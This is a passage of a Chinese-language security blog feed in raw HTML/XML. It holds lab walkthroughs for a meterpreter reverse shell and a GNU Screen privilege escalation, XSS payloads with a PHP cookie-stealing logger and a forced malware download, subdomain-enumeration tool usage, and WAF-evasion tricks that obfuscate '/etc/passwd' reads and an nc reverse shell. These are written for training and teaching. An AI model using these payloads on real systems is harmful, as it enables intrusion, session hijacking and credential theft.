class="hljs-attribute">meterpreter</span>执行的命令<br><span class="hljs-attribute">ps</span><br><span class="hljs-attribute">migrate</span> <span class="hljs-number">993</span><br><span class="hljs-attribute">993</span>    <span class="hljs-number">872</span>    php-fpm<span class="hljs-number">7</span>.<span class="hljs-number">1</span>         x<span class="hljs-number">86</span>_<span class="hljs-number">64</span>  www-data         .<br></code></pre></div></td></tr></table></figure><h2 id="生成64位的payload"><a href="#生成64位的payload" class="headerlink" title="生成64位的payload"></a>生成64位的payload</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">msfvenom -p linux<span class="hljs-regexp">/x64/m</span>eterpreter_reverse_tcp LHOST=<span class="hljs-number">10.10</span>.<span class="hljs-number">14.18</span> LPORT=<span class="hljs-number">446</span> -f elf -o w64.elf<br><br>handler -H <span class="hljs-number">10.10</span>.<span class="hljs-number">14.18</span> -P <span class="hljs-number">446</span> -p linux<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp<br><br>wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">14.18</span><span class="hljs-regexp">/w64.elf -P /</span>tmp<br>./w64.elf<br><br>use post<span class="hljs-regexp">/multi/</span>recon/local_exploit_suggester<br>set SESSION <span class="hljs-number">6</span><br>run<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-18-10/5.PNG" alt="5"></p><h2 id="linuEnum-sh"><a href="#linuEnum-sh" class="headerlink" title="linuEnum.sh"></a>linuEnum.sh</h2><p>wget <a href="http://10.10.14.18/l.sh">http://10.10.14.18/l.sh</a> -P /tmp<br>chmod加权限并运行</p><p>发现口令</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>.htpasswd<br>admin:<span class="hljs-variable">$apr1</span><span class="hljs-variable">$7hIqRwgr</span>$.QPU0yknBQRTf3WW9jfFp.<br><br>存在的用户<br>centreon、shelby、sysmonitor<br><br><span class="hljs-regexp">/home/</span>sysmonitor/.sudo_as_admin_successful<br>说明普通用户sysmonitor用sudo可以得到最高权限<br></code></pre></div></td></tr></table></figure><p>password1</p><h2 id="hash类型识别"><a href="#hash类型识别" class="headerlink" title="hash类型识别"></a>hash类型识别</h2><p>MD5(APR)<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-18-10/6.PNG" alt="6"></p><p>尝试爆破和搜索hash，无结果。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-18-10/7.PNG" alt="7"></p><h2 id="html-zip"><a href="#html-zip" class="headerlink" title="html.zip"></a>html.zip</h2><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">unzip html.zip<br><span class="hljs-symbol">Archive:</span>  html.zip<br><span class="hljs-symbol">   creating:</span> html/<br><span class="hljs-symbol"> extracting:</span> html/aa.php             <br><span class="hljs-symbol">  inflating:</span> html/index.html         <br><span class="hljs-symbol">  inflating:</span> html/panel.php          <br><span class="hljs-symbol">   creating:</span> html<span class="hljs-meta-keyword">/monitoring/</span><br><span class="hljs-symbol">  inflating:</span> html<span class="hljs-meta-keyword">/monitoring/</span>index.html  <br><span class="hljs-symbol">  inflating:</span> html<span class="hljs-meta-keyword">/monitoring/</span>.htaccess <br><br>cat .htaccess<br>AuthUserFile <span class="hljs-meta-keyword">/etc/</span>.htpasswd<br>AuthName <span class="hljs-string">&quot;Protected area by the admin&quot;</span><br>AuthType Basic<br><span class="hljs-params">&lt;Limit GET&gt;</span><br>require valid-user<br><span class="hljs-params">&lt;/Limit&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="suid"><a href="#suid" class="headerlink" title="suid"></a>suid</h2><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">cd <span class="hljs-regexp">/usr/</span>lib/eject;<br>./dmcrypt-get-device<br>Usage: dmcrypt-get-device &lt;device&gt;<br><br>strings dmcrypt-get-device<br><br>---<br>cd <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/dbus-1.0/</span>;<span class="hljs-keyword">file</span> dbus-daemon-launch-helper<br><br>strings dbus-daemon-launch-helper<br>No memory to <span class="hljs-keyword">read</span> directory entry<br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/dbus-1/</span>session.conf<br><br>./dbus-daemon-launch-helper<br></code></pre></div></td></tr></table></figure><h2 id="screen提权"><a href="#screen提权" class="headerlink" title="screen提权"></a>screen提权</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">GNU<span class="hljs-built_in"> Screen </span>4.5.0 - Local Privilege Escalation                                          | exploits/linux/local/41154.sh<br><br>vi 41154.sh<br>:<span class="hljs-builtin-name">set</span> <span class="hljs-attribute">ff</span>=unix<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-18-10/8.PNG" alt="8"></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span>  http://<span class="hljs-number">10.10.14.18</span>/<span class="hljs-number">41154</span>.sh /tmp<br><span class="hljs-attribute">chomd</span> +x <span class="hljs-number">41154</span>.sh;./<span class="hljs-number">41154</span>.sh<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-18-10/9.PNG" alt="9"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="在migrate的时候，出错是什么原因？"><a href="#在migrate的时候，出错是什么原因？" class="headerlink" title="在migrate的时候，出错是什么原因？"></a>在migrate的时候，出错是什么原因？</h3><figure class="highlight oxygene"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs oxygene">migrate <span class="hljs-number">36582</span><br>[-] Error running command migrate: NoMethodError undefined <span class="hljs-function"><span class="hljs-keyword">method</span> `<span class="hljs-title">pid</span>&#x27; <span class="hljs-title">for</span> <span class="hljs-title">nil</span>:</span>NilClass<br><br></code></pre></div></td></tr></table></figure><p><a href="https://www.jianshu.com/p/c6802c4f03e2">POST模块、后门</a><br>根据这篇文章，可以用模块迁移pid，无需使用ps然后再<code>migrate pid</code>。</p><p><code>run post/windows/manage/migrate</code></p><h3 id="提权脚本"><a href="#提权脚本" class="headerlink" title="提权脚本"></a>提权脚本</h3><p><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS"># LinPEAS - Linux Privilege Escalation Awesome Script</a></p><p>时间所限，先这样吧。</p><h3 id="suid-priv"><a href="#suid-priv" class="headerlink" title="suid priv"></a>suid priv</h3><p><a href="https://hellohxk.com/blog/exploit-exercises-nebula/">linux suid提权 &amp; 渗透测试练习nebula</a></p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透实战第三版实验csk-web之XSS</title>
    <link href="/2019/11/16/07-x/"/>
    <url>/2019/11/16/07-x/</url>
    
    <content type="html"><![CDATA[<p>参考资料：<br>下载地址：</p><ul><li><a href="http://thehackerplaybook.com/get.php?type=csk-web">http://thehackerplaybook.com/get.php?type=csk-web</a></li></ul><p><code>echo 目标机器的ip chat &gt;&gt; /etc/hosts</code></p><p>首先我们看下这个网站，注册一个账号并登陆。网页上有一些存在漏洞的提示。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-16-07/59.PNG" alt="59"></p><h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p><code>http://chat:3000/chatchannel/1</code></p><p>反射型XSS是最简单的xss，因为网页没有过滤用户输入，或者过滤不完全，导致用户可以输入js语句，根据js语句的不同，可以任意执行js代码。</p><h3 id="案例一，script标签"><a href="#案例一，script标签" class="headerlink" title="案例一，script标签"></a>案例一，script标签</h3><p><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-16-07/60.PNG" alt="60"></p><h3 id="案例二，过滤script标签的情况"><a href="#案例二，过滤script标签的情况" class="headerlink" title="案例二，过滤script标签的情况"></a>案例二，过滤script标签的情况</h3><p><code>&lt;svg onload=alert(1788)&gt;</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-16-07/2.PNG" alt="2"></p><h3 id="案例三，点击弹窗"><a href="#案例三，点击弹窗" class="headerlink" title="案例三，点击弹窗"></a>案例三，点击弹窗</h3><p><code>&lt;b onmouseover=alert(&#39;XSS&#39;)&gt;Click Me!&lt;/b&gt;</code><br>一旦鼠标移到Click Me!，就提示xss</p><hr><p>一旦点击就弹窗</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">window</span>.location = <span class="hljs-string">&quot;https://www.youtube.com/watch?v=dQw4w9WgXcQ&quot;</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-16-07/3.PNG" alt="3"></p><h3 id="案例四，跳转并文件下载"><a href="#案例四，跳转并文件下载" class="headerlink" title="案例四，跳转并文件下载"></a>案例四，跳转并文件下载</h3><p>kali准备恶意代码exe，并开启web服务：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m SimpleHTTPServer <span class="hljs-number">8001</span><br></code></pre></div></td></tr></table></figure><p>kali的ip为192.168.159.129</p><p>访问路径为：<code>http://192.168.159.129:8001/test.exe</code></p><p>在页面上输入以下代码：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-keyword">var</span> link = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;a&#x27;</span>); link.href = <span class="hljs-string">&#x27;http://192.168.159.129:8001/test.exe&#x27;</span>; link.download = <span class="hljs-string">&#x27;&#x27;</span>; <span class="hljs-built_in">document</span>.body.appendChild(link); link.click();</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>于是客户端就会跳转到这个下载地址，<a href="http://192.168.159.129:8001/test.exe">http://192.168.159.129:8001/test.exe</a></p><p>这个跳转并文件下载要配合存储型xss。</p><h3 id="案例五：cookie窃取"><a href="#案例五：cookie窃取" class="headerlink" title="案例五：cookie窃取"></a>案例五：cookie窃取</h3><p>将下面的php代码保存为cookie.php</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header (<span class="hljs-string">&#x27;Location:https://google.com&#x27;</span>);<br><span class="hljs-variable">$cookies</span> =<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>];<br><span class="hljs-variable">$file</span> = fopen(<span class="hljs-string">&#x27;log.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>);<br>fwrite(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$cookies</span> . <span class="hljs-string">&quot;\n\n&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br><br>注意第二行header()，不能删除，如果没有这一行，那么目标点击窃取cookie的恶意链接，就会访问http:<span class="hljs-comment">//192.168.159.129:8002/cookie.php?c=xxxxx</span><br>这样很容易被发现。<br></code></pre></div></td></tr></table></figure><p>然后用php开启web服务，</p><p>php -S 192.168.159.129:8002</p><p>这是kali的地址：<a href="http://192.168.159.129:8002/cookie.php">http://192.168.159.129:8002/cookie.php</a></p><p>存在漏洞的页面输入以下代码：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.location=<span class="hljs-string">&quot;http://192.168.159.129:8002/cookie.php?c=&quot;</span>+<span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-16-07/61.PNG" alt="61"></p><p>成功获取到了admin账号的cookie。</p><p>但是这里有个问题，就是使用cookie登陆时候，发现cookie失效的时间太短了。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-16-07/62.PNG" alt="62"><br>经过数次尝试，因为输入窃取cookie的js代码，会跳转到<code>google.com</code>，这会导致用户的cookie退出网页，使得cookie直接失效。。</p><p>要注意的是，速度要快。。cookie过期跟服务端的网页设置有关。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-16-07/63.PNG" alt="63"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>子域名搜集</title>
    <link href="/2019/11/13/11-x/"/>
    <url>/2019/11/13/11-x/</url>
    
    <content type="html"><![CDATA[<p><a href="https://whale3070.github.io/scan/2019/07/31/11-x/">上一篇</a>说到了基于字典爆破的子域名搜集，这一篇讲一下基于搜索的子域名搜集。</p><p>由于有些网站的子域名非常独特，字典上是没有的。</p><h2 id="Sublist3r"><a href="#Sublist3r" class="headerlink" title="Sublist3r"></a>Sublist3r</h2><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">git clone https:<span class="hljs-comment">//github.com/Plazmaz/Sublist3r.git /opt/Sublist3r</span><br><span class="hljs-keyword">cd</span> /opt/Sublist3r<br>pip install -r requirements.txt<br>python sublist3r.py -<span class="hljs-keyword">d</span> yahoo.com -t 50 -p 80,443,21,22<br>运行报了一个错<br>Traceback (most recent call last):<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;sublist3r.py&quot;</span>, <span class="hljs-keyword">line</span> 78, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    takeover_check=takeover_check, engines=engines)<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;sublist3r.py&quot;</span>, <span class="hljs-keyword">line</span> 59, <span class="hljs-keyword">in</span> main<br>    <span class="hljs-keyword">return</span> scanner.scan()<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;/opt/Sublist3r/subscann3r.py&quot;</span>, <span class="hljs-keyword">line</span> 87, <span class="hljs-keyword">in</span> scan<br>    <span class="hljs-keyword">e</span>.<span class="hljs-keyword">run</span>()<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;/opt/Sublist3r/engines/engine.py&quot;</span>, <span class="hljs-keyword">line</span> 39, <span class="hljs-keyword">in</span> <span class="hljs-keyword">run</span><br>    domain_list = self.enumerate()<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;/opt/Sublist3r/engines/engine.py&quot;</span>, <span class="hljs-keyword">line</span> 418, <span class="hljs-keyword">in</span> enumerate<br>    <span class="hljs-keyword">token</span> = self.get_csrftoken(resp)<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;/opt/Sublist3r/engines/engine.py&quot;</span>, <span class="hljs-keyword">line</span> 413, <span class="hljs-keyword">in</span> get_csrftoken<br>    <span class="hljs-keyword">token</span> = csrf_regex.findall(resp)[0]<br>IndexError: <span class="hljs-keyword">list</span> index <span class="hljs-keyword">out</span> of <span class="hljs-keyword">range</span><br></code></pre></div></td></tr></table></figure><p>于是使用</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/aboul3la/</span>Sublist3r <span class="hljs-regexp">/opt/</span>sublist3r<br>cd <span class="hljs-regexp">/opt/</span>sublist3r<br>python sublist3r.py -d google.com<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-13-11/22.PNG" alt="22"></p><h2 id="subbrute"><a href="#subbrute" class="headerlink" title="subbrute"></a>subbrute</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Plazmaz/</span>Sublist3r.git <span class="hljs-regexp">/opt/</span>Sublist3r<br>cd <span class="hljs-regexp">/opt/</span>Sublist3r/subbrute<br>chmod +x subbrute.py<br>./subbrute.py google.com<br></code></pre></div></td></tr></table></figure><h2 id="wydomain"><a href="#wydomain" class="headerlink" title="wydomain"></a>wydomain</h2><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/ring04h/wydomain /<span class="hljs-keyword">opt</span>/wydomain<br><span class="hljs-keyword">cd</span> /<span class="hljs-keyword">opt</span>/wydomain<br>pip install -r requirements.txt<br><br><span class="hljs-keyword">python</span> wydomain.<span class="hljs-keyword">py</span> -h<br><span class="hljs-keyword">python</span> wydomain.<span class="hljs-keyword">py</span> -d google.<span class="hljs-keyword">com</span> -<span class="hljs-keyword">o</span> out.txt<br><br>搜索结果是<span class="hljs-number">1022</span>个子域名。<br><span class="hljs-keyword">cat</span> /<span class="hljs-keyword">opt</span>/wydomain/out.txt<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-13-11/23.PNG" alt="23"></p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>绕过waf之命令执行</title>
    <link href="/2019/11/11/12-x/"/>
    <url>/2019/11/11/12-x/</url>
    
    <content type="html"><![CDATA[<h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>人生不是做菜，不能等所有材料准备好了再下锅。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">命令执行的一些绕过技巧</a></p><p><a href="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8">Web Application Firewall (WAF) Evasion Techniques</a></p><p><a href="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0">Web Application Firewall (WAF) Evasion Techniques #2</a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>本文要讨论的是在linux系统中，当有rce(远程命令执行)漏洞时，绕过waf的操作有哪些。</p><h3 id="基础知识提要"><a href="#基础知识提要" class="headerlink" title="基础知识提要"></a>基础知识提要</h3><p>wildcard通配符，又叫做globbing通配符，有很多语法可以使用？/和数字+字母，就可以执行系统命令。<br>例如：</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-11-12/13.PNG" alt="13"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/???/</span>?s --help<br>就通过通配符，代替了<span class="hljs-regexp">/bin/</span>ls --help，执行了系统命令<br></code></pre></div></td></tr></table></figure><p>如果防火墙没有过滤？和/,那么就可以构造通配符的命令注入</p><p>使用这种方式  <code>/bin/cat /etc/passwd</code></p><p>可以写为       <code>/???/??t /??c/p???w?</code></p><p>然后url编码一下，<code>%20%2f%3f%3f%3f%2f%3f%3f%74%20%2f%3f%3f%63%2f%70%3f%3f%3f%77%3f</code>就可以绕过waf进行命令执行。</p><p><code>/???/??t /??c/p???w?</code>虽然会执行<code>/bin/cat /etc/passwd</code>，但是同时也会执行/dev/net，/etc/apt，因为/???/??t就是以t结尾，规定了字符长度而已，所以会grobbing匹配，也就是环回滚动依次匹配的意思。</p><h3 id="nc反弹shell的案例"><a href="#nc反弹shell的案例" class="headerlink" title="nc反弹shell的案例"></a>nc反弹shell的案例</h3><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">nc -e <span class="hljs-regexp">/bin/</span>bash <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1337</span><br><br><span class="hljs-regexp">/???/</span>n? -e <span class="hljs-regexp">/???/</span>b??h <span class="hljs-number">2130706433</span> <span class="hljs-number">1337</span><br></code></pre></div></td></tr></table></figure><p>使用上面提到的方式，可以将nc反弹shell的语句修改为这样。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-11-12/14.PNG" alt="14"></p><p>可以在线转换ip转换为int，这样可以避免使用IP中的小数点，进一步绕过waf规则。</p><blockquote><p>这里普及一下基础知识：IP地址是一个32位的二进制数，通常被分割为4个“8位二进制数”（也就是4个字节）。IP地址通常用“点分十进制”表示成（a.b.c.d）的形式，其中，a,b,c,d都是0~255之间的十进制整数。例：点分十进IP地址（100.4.5.6），实际上是32位二进制数（01100100.00000100.00000101.00000110）</p></blockquote><h3 id="使用-而不是"><a href="#使用-而不是" class="headerlink" title="使用?而不是*"></a>使用<code>?</code>而不是<code>*</code></h3><p>在linux中，？和*都可以作为通配符。但是在sql中<code>/*代表注释*/</code>，所以最好使用更加不容易被过滤的<code>？</code>而不是<code>*</code></p><h3 id="如果过滤了ls可以使用echo"><a href="#如果过滤了ls可以使用echo" class="headerlink" title="如果过滤了ls可以使用echo"></a>如果过滤了ls可以使用echo</h3><p>echo /???/??ss??</p><p>可以枚举存在的目录和文件<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-11-12/15.PNG" alt="15"></p><h3 id="sql注入-waf绕过"><a href="#sql注入-waf绕过" class="headerlink" title="sql注入-waf绕过"></a>sql注入-waf绕过</h3><p>使用注释/**/代替空格，例如<code>/?id=1+un/**/ion+sel/**/ect+1,2,3--</code><br>不能在本地文件包含或者命令执行中使用。</p><p>参考fluxcapacitor，使用连接字符串，绕过waf</p><h3 id="连接符过waf"><a href="#连接符过waf" class="headerlink" title="连接符过waf"></a>连接符过waf</h3><p>这种方法可以过滤以正则表达式搜索短语的过滤规则。</p><h4 id="加号"><a href="#加号" class="headerlink" title="加号"></a>加号</h4><ul><li>加号，在许多编程语言中，通常可以连接两个字符串</li></ul><h4 id="点号"><a href="#点号" class="headerlink" title="点号"></a>点号</h4><p>在php中，点号.可以连接两个字符串，例如</p><figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">$ php -r <span class="hljs-symbol">&#x27;echo</span> <span class="hljs-string">&quot;hello&quot;</span>.<span class="hljs-string">&quot; world&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;&#x27;<br>hello world<br>$ python -c <span class="hljs-symbol">&#x27;print</span> <span class="hljs-string">&quot;hello&quot;</span> + <span class="hljs-string">&quot; world&quot;</span>&#x27;<br>hello world<br></code></pre></div></td></tr></table></figure><h4 id="空格和双引号"><a href="#空格和双引号" class="headerlink" title="空格和双引号"></a>空格和双引号</h4><p>在python中，空格和双引号可以连接两个字符串，例如：<br><code>python -c &#39;print &quot;te&quot; &quot;st&quot;&#39;</code></p><h4 id="单引号"><a href="#单引号" class="headerlink" title="单引号"></a>单引号</h4><p>在bash中，单引号可以作为连接符，注意单引号要成双数来闭合引号。</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-built_in">test</span></span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;t&#x27;</span>e<span class="hljs-string">&#x27;s&#x27;</span>t</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;te&#x27;</span>st</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;te&#x27;</span>st<span class="hljs-string">&#x27;&#x27;</span></span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;te&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>st<span class="hljs-string">&#x27;&#x27;</span></span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>waf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>waf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Wall-rce与绕过waf(上)</title>
    <link href="/2019/11/09/09-x/"/>
    <url>/2019/11/09/09-x/</url>
    
